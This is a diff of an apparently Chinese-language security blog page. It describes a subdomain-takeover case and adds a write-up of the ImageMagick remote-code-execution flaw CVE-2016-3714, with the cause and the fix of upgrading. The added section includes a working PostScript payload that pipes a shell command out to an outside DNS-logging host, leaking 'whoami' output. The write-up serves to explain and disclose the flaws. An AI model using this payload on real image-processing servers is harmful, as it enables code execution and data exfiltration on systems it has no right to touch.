@@ -152,7 +152,7 @@
 
         <div id="main">
             <div class="post_page_title_img" style="height: 25rem;background-image: url(http://wx1.sinaimg.cn/large/d2e27164gy1fbtny6yzxdj21kw13xkjm.jpg);background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;">
-                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2>singularity漏洞分享_实时更新</h2></a>
+                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2>Singularity漏洞分享_实时更新</h2></a>
             </div>
             <!-- Post -->
             <div class="typo" style="padding: 3rem;">
@@ -170,7 +170,7 @@
 <td>一、子域名劫持</td>
 </tr>
 <tr>
-<td>A2</td>
+<td>二、ImageMagick远程代码执行漏洞分析</td>
 </tr>
 <tr>
 <td>A3</td>
@@ -190,6 +190,15 @@
 <h4 id="探究"><a href="#探究" class="headerlink" title="探究"></a>探究</h4><p>1、使用dig探测某子域名，img1.aim.com,发现状态为NXDOMAIN(意为域名不存在，Non-Existent)，域名服务器声明查询域名确实是自己所解析，但是自己的记录里没有这个域名</p>
 <p><img src="https://raw.githubusercontent.com/Kaleryou/kaleryou.github.io/master/tupian/singularity-1.png" alt="singularity-1"><br>2、可以看出域名img1.aim.com的CNAME记录指向 img1.aim.com.wswebpic.com，而网宿的DNS “img1.aim.com.wswebpic.com” 已不支持解析该DNS请求，CDN加速业务已停止<br>以下是dig检测该域名 img.aim.com的追踪DNS解析全过程如下：<br><img src="https://raw.githubusercontent.com/Kaleryou/kaleryou.github.io/master/tupian/singularity-2.png" alt="singularity-2"><br><img src="https://raw.githubusercontent.com/Kaleryou/kaleryou.github.io/master/tupian/singularity-3.png" alt="singularity-3"><br>3、攻击者可以在网宿CDN购买套餐，并绑定该域名，从而劫持该域名</p>
 <h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p>在更换CDN时，及时更新相关DNS记录配置</p>
+<h2 id="二、ImageMagick远程代码执行漏洞分析"><a href="#二、ImageMagick远程代码执行漏洞分析" class="headerlink" title="二、ImageMagick远程代码执行漏洞分析"></a>二、ImageMagick远程代码执行漏洞分析</h2><blockquote>
+<p>CVE编号   |   CVE-2016-3714<br>影响版本     |    *    ImageMagick6.5.7-8 2012-08-17</p>
+<pre><code>*   ImageMagick6.7.7-10 2014-03-06
+*   低版本至6.9.3-9 released 2016-04-30
+</code></pre></blockquote>
+<h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>产生原因是因为字符过滤不严谨所导致的执行代码. 对于文件名传递给后端的命令过滤不足,导致允许多种文件格式转换过程中远程执行代码</p>
+<h4 id="探究-1"><a href="#探究-1" class="headerlink" title="探究"></a>探究</h4><p>1、图片命令解析代码，bqk31q.ceye.io此处使用ceyeDNS LOG查看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">save</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">&#123; legal &#125; stopped &#123; pop &#125; if</span><br><span class="line">restore</span><br><span class="line">mark /OutputFile (%pipe%ping -c 1 `whoami`.longxin.bqk31q.ceye.io) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure></p>
+<p>2、上传或发送图片，查看DNS LOG<br><img src="https://raw.githubusercontent.com/Kaleryou/kaleryou.github.io/master/tupian/singularity-4.png" alt="singularity-4"><br><img src="https://raw.githubusercontent.com/Kaleryou/kaleryou.github.io/master/tupian/singularity-5.png" alt="singularity-5"></p>
+<h4 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h4><p>升级ImageMagick版本</p>
 
             </div>
 
@@ -252,8 +261,8 @@ $('.btn_click_load').click(function() {
 -->
 <script type="text/javascript">
     var disqus_config = function () {
-        this.page.url = 'http://yoursite.com/2019/03/27/singularity漏洞分享_实时更新/';  // Replace PAGE_URL with your page's canonical URL variable
-        this.page.identifier = 'http://yoursite.com/2019/03/27/singularity漏洞分享_实时更新/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        this.page.url = 'http://yoursite.com/2019/03/27/Singularity漏洞分享_实时更新/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://yoursite.com/2019/03/27/Singularity漏洞分享_实时更新/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
     };
 </script>
 
